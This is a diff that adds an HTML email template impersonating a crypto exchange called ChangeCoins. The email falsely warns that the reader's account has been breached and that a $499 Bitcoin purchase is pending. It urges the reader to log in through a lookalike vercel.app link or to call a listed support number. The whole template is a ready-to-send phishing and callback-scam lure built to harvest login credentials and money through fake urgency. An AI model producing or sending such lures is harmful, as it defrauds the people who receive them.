@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ChangeCoins spay</title>
+    <script>
+        function formatDate(date) {
+            const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+            let day = date.getDate();
+            let month = months[date.getMonth()];
+            let year = date.getFullYear();
+            return `${day} ${month}, ${year}`;
+        }
+
+        function updateDate() {
+            let currentDate = new Date();
+            let formattedDate = formatDate(currentDate);
+            document.getElementById("purchaseDate").innerText = formattedDate;
+        }
+
+        window.onload = updateDate;
+    </script>
+</head>
+
+<body style="font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: white;">
+    <table width="100%" cellpadding="0" cellspacing="0" border="0"
+        style="max-width: 700px; margin: auto; background-color: white;">
+        <tr>
+            <td>
+                <img src="https://media-hosting.imagekit.io//c6eafbe000f5459e/HEADER.png?Expires=1836824648&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=a5Fc4pHn3~ARHv-fAiJW2V8J5FhIWTGbys5mh6MfVfVHyLvwYtVuWUCWsE~079H-0jJmirvulIn-i5RKIyNsbw2y68Iqh~0h3KH1swZpH9JEz2ED2vyO43Vk~YZacezFPcqiqG~dSa6CtoLAlKjY2DGFubA~sokIF5GQQ7gUBk7XfOsTmv44yN1ntCtI3HGZeHrIs4PJHeAPP20Pmoq~gI3RrSxs0aojatn5q8lPOTKxq~nI2qdLJ6jWuUF5EG4DCMhVEJSO5XtDBNNfwjuaudgqigOTicwjH-LDLlwTFQlzst2-RfdoiZDZPXf-B8YQT9yb7EkqVppfmEyhIdZRbg__"
+                    width="100%" alt="Header Image" style="display: block;">
+            </td>
+        </tr>
+        <tr>
+            <td align="center" style="padding: 20px;">
+                <h1 style="font-size: 24px;">Immediate Action Required - Your Crypto Account Has Been Breached!</h1>
+            </td>
+        </tr>
+        <tr>
+            <td style="padding: 20px;">
+                <p><strong>Dear Customer,</strong></p>
+                <p>We hope this message finds you well!</p>
+                <p>We are reaching out to inform you that we have detected a potential security breach involving your <strong>ChangeCoins</strong> account. Specifically, an invoice for a recent Bitcoin (BTC) purchase, valued at $499, will be generated shortly. This invoice will include detailed information about your transaction, including the amount and any applicable fees.</p>
+                <p><strong>Billed To:</strong></p>
+
+                <div style="border: 1px solid #000; padding: 4px 2px;">
+
+                    <table width="100%" border="0" cellspacing="0" cellpadding="5">
+                        <tr>
+                            <td><strong>Customer ID:</strong> UK12H45</td>
+                            <td><strong>Invoice Number:</strong> IMV9TR765</td>
+                            <td><strong>Purchase Date:</strong> <span id="purchaseDate">17 March, 2025</span></td>
+                        </tr>
+                    </table>
+                </div>
+            </td>
+        </tr>
+        <tr>
+            <td style="padding: 20px;">
+                <p style="font-weight: bold;">Product Details:</p>
+                <table width="100%" border="0" cellspacing="0" cellpadding="5">
+                    <tr style="background-color:#ddf8ea; color:black;padding: 10px;">
+                        <th>Product</th>
+                        <th>Price</th>
+                        <th>Quantity</th>
+                        <th>Total</th>
+                    </tr>
+                    <tr>
+                        <td align="center"><img
+                                src="https://media.istockphoto.com/id/882085928/vector/blockchain-bitcoin-icon-symbol-vector.jpg?s=612x612&w=0&k=20&c=uv_6f1BKQBRS8UQfz6TZTN2GoOZ--lUHojCpvGvm_4Y="
+                                width="100" alt="Bitcoin"></td>
+                        <td align="center">$499</td>
+                        <td align="center">1</td>
+                        <td align="center">$499</td>
+                    </tr>
+                </table>
+                <p style="background-color:#ddf8ea; color:black; padding: 10px; text-align:right; font-size: large;">
+                    <strong>Total: $499</strong></p>
+            </td>
+        </tr>
+        <tr>
+            <td style="padding: 10px;">
+                <p>The invoice will be sent to your email and will also be accessible through your <strong>ChangeCoin</strong> account. If you believe this transaction is unauthorized or if you have any questions or concerns, please take immediate action by either approving or declining the transaction through your account.</p>
+            
+                <p><strong>To Take Action:</strong></p>
+                <ul>
+                    <li>Log in to your account: <a href="https://changecoing-page.vercel.app/"> <strong> https://changecoing-page.vercel.app/ </strong></a></li>
+                    <li>Contact our customer support team for assistance at: <strong> <a  href="tel:+1-828-270-6316">+1-828-270-6316</a></strong></li>
+                </ul>
+                
+                <p>
+                    Your prompt attention to this matter is essential for the security of your account. We appreciate your cooperation in ensuring the safety of your cryptocurrency transactions.
+                </p>
+
+                        <p>Thank you for choosing <strong>ChangeCoin</strong> for your digital asset management.
+                        </p>
+                       <p> Sincerely,<br>
+                        The ChangeCoin Team   </p>
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <img src="https://media-hosting.imagekit.io//5d49a7c92af84a17/FOOTER.png?Expires=1836824648&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=S4cgo2AGy4WmOpGoTe04W12zFiJQcy2Gxq1Ggl0MxxFpeucYkAEIBYdOtOTZ5Pd7szWIzr1AVMp4oXE6WOdA5qY3XOmUxLEzI~JfWuo19JIsVfzmcHyToKn0lEoVOOs8LCzw9YGY6jpt4tt1VFYMRFPFunfw9b8uqz0iqap~k9AvhxFHElGYX32647toslnTkPDq3b9bBUWImL0RxfGvxv7z4skY~ELFOdc3H-aMy9Oy8xm~kzVLUHXdTb~mHgDmQSyFy2pvMm~5MHn6GFjTSJV0nh56EonVQPYYZ62SsGbVKSNP7fw7430GBy80iYidetlJcZLW9tYoB4gs6cAz4g__"
+                    width="100%" alt="Footer Image" style="display: block;">
+            </td>
+        </tr>
+    </table>
+</body>
+
+</html>
